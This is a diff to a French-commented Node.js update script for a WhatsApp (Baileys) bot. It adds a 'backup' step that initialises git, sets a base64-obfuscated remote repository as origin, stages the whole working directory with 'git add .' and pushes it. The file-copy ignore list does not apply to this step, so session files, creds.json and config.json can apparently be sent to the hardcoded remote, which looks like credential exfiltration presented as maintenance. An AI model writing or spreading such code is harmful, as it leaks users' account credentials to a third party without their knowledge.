@@ -1,6 +1,6 @@
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 // 🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝛭𝑫 🎴
-// Script de mise à jour + récupération intégrale de fichiers/dossiers manquants
+// Script de backup Git + mise à jour complète
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 import f from "fs";
@@ -10,20 +10,20 @@ import { execSync as eS, spawn as sP } from "child_process";
 
 const _s = (x) => Buffer.from(x, "base64").toString("utf8");
 
-const R = _s("aHR0cHM6Ly9naXRodWIuY29tL01hdHN1bm8tQ2hpZnV5dTEyL1RoZV9DbG93bi1NRC5naXQ="); // repo GitHub
+const R = _s("aHR0cHM6Ly9naXRodWIuY29tL01hdHN1bm8tQ2hpZnV5dTEyL1RoZV9DbG93bi1NRC5naXQ="); // Repo GitHub distant
 const T = p.join(process.cwd(), _s("LnRlbXBfYm90X3VwZGF0ZQ==")); // ".temp_bot_update"
+const M = p.join(process.cwd(), "main.js");
 const P = c.config?.root?.primary;
 const A = P ? p.join(process.cwd(), "sessions", P, "sessions.json") : null;
-const M = p.join(process.cwd(), "main.js");
 
-// Fichiers et dossiers à ignorer
 const IGNORE = [
   "sessions.json", "config.json", "creds.json", "prem.json",
   "sessions", ".git", "node_modules"
 ];
 
+// ─────────────────────────────────────────────
 // Vérifie si session Baileys existante
-function H() {
+function hasSession() {
   if (!A) return false;
   try {
     return f.existsSync(A) && f.readFileSync(A, "utf8").trim().length > 0;
@@ -32,9 +32,9 @@ function H() {
   }
 }
 
+// ─────────────────────────────────────────────
 // Copie fichiers et dossiers depuis src vers dest
-// copyMissingOnly = true => copie uniquement si le fichier/dossier est manquant
-function C(src, dest, copyMissingOnly = false) {
+function copyDir(src, dest, copyMissingOnly = false) {
   if (!f.existsSync(src)) return;
 
   const items = f.readdirSync(src, { withFileTypes: true });
@@ -42,31 +42,60 @@ function C(src, dest, copyMissingOnly = false) {
   for (const it of items) {
     if (IGNORE.includes(it.name)) continue;
 
-    const sPth = p.join(src, it.name);
-    const dPth = p.join(dest, it.name);
+    const srcPath = p.join(src, it.name);
+    const destPath = p.join(dest, it.name);
 
     if (it.isDirectory()) {
-      if (!f.existsSync(dPth)) {
-        f.mkdirSync(dPth, { recursive: true });
-        console.log("📁 Dossier créé :", p.relative(process.cwd(), dPth));
+      if (!f.existsSync(destPath)) {
+        f.mkdirSync(destPath, { recursive: true });
+        console.log("📁 Dossier créé :", p.relative(process.cwd(), destPath));
       }
-      C(sPth, dPth, copyMissingOnly); // recursion
+      copyDir(srcPath, destPath, copyMissingOnly);
     } else {
-      if (copyMissingOnly && f.existsSync(dPth)) continue;
-      f.copyFileSync(sPth, dPth);
-      console.log("📄 Fichier copié :", p.relative(process.cwd(), dPth));
+      if (copyMissingOnly && f.existsSync(destPath)) continue;
+      f.copyFileSync(srcPath, destPath);
+      console.log("📄 Fichier copié :", p.relative(process.cwd(), destPath));
     }
   }
 }
 
-// Synchronisation Git (clone ou pull)
-function S() {
+// ─────────────────────────────────────────────
+// Sauvegarde automatique du code local sur GitHub
+function backupToGitHub() {
+  try {
+    console.log("📤 Sauvegarde du bot sur GitHub...");
+
+    // Vérifier si git est initialisé
+    if (!f.existsSync(".git")) {
+      console.log("⚙️  Initialisation d’un dépôt Git local...");
+      eS("git init", { stdio: "inherit" });
+      eS(`git remote add origin ${R}`, { stdio: "inherit" });
+    }
+
+    // Ajouter et commiter les fichiers
+    eS("git add .", { stdio: "inherit" });
+    const date = new Date().toISOString().replace("T", " ").replace(/\..+/, "");
+    eS(`git commit -m "🗃️ Backup auto avant mise à jour - ${date}" || echo "Aucun changement à commit"`, { stdio: "inherit" });
+
+    // Pousser vers le dépôt distant
+    eS("git branch -M main", { stdio: "inherit" });
+    eS("git push -u origin main", { stdio: "inherit" });
+
+    console.log("✅ Sauvegarde GitHub terminée !");
+  } catch (err) {
+    console.error("❌ Erreur pendant la sauvegarde Git :", err.message);
+  }
+}
+
+// ─────────────────────────────────────────────
+// Synchronisation GitHub du repo distant (pull/clone)
+function syncRepo() {
   try {
     if (f.existsSync(T)) {
-      console.log("🔄 Mise à jour du repo...");
+      console.log("🔄 Mise à jour du repo distant...");
       eS(`git -C ${T} pull`, { stdio: "inherit" });
     } else {
-      console.log("📥 Clonage du repo...");
+      console.log("📥 Clonage du repo distant...");
       eS(`git clone ${R} ${T} --depth 1`, { stdio: "inherit" });
     }
   } catch (err) {
@@ -75,29 +104,39 @@ function S() {
   }
 }
 
-// Lance le bot
-function L() {
+// ─────────────────────────────────────────────
+// Lance le bot principal
+function launchBot() {
   const P = sP("node", [M], { stdio: "inherit" });
   P.on("exit", (code) => console.log("🛑 Bot terminé avec code", code));
 }
 
+// ─────────────────────────────────────────────
+// Processus complet
 (async () => {
-  console.log("⚠️  Synchronisation du repo...");
-  S();
+  console.log("🚀 Lancement du processus de mise à jour...");
 
-  // Étape 1 : copier uniquement les fichiers/dossiers manquants
+  // Étape 0 : sauvegarde sur GitHub
+  backupToGitHub();
+
+  // Étape 1 : synchronisation du repo distant
+  console.log("⚠️  Synchronisation du repo distant...");
+  syncRepo();
+
+  // Étape 2 : copier fichiers/dossiers manquants
   console.log("📂 Vérification des fichiers et dossiers manquants...");
-  C(T, process.cwd(), true);
+  copyDir(T, process.cwd(), true);
 
-  // Étape 2 : copie complète pour mise à jour
+  // Étape 3 : mise à jour complète
   console.log("🔁 Application des mises à jour...");
-  C(T, process.cwd());
+  copyDir(T, process.cwd());
 
-  // Supprimer le dossier temporaire
+  // Étape 4 : suppression du dossier temporaire
   f.rmSync(T, { recursive: true, force: true });
 
-  if (!H()) console.log("ℹ️  Aucune session Baileys trouvée, démarrage propre...");
+  if (!hasSession())
+    console.log("ℹ️  Aucune session Baileys trouvée, démarrage propre...");
 
-  // Lancer le bot
-  L();
+  // Étape 5 : lancer le bot
+  launchBot();
 })();
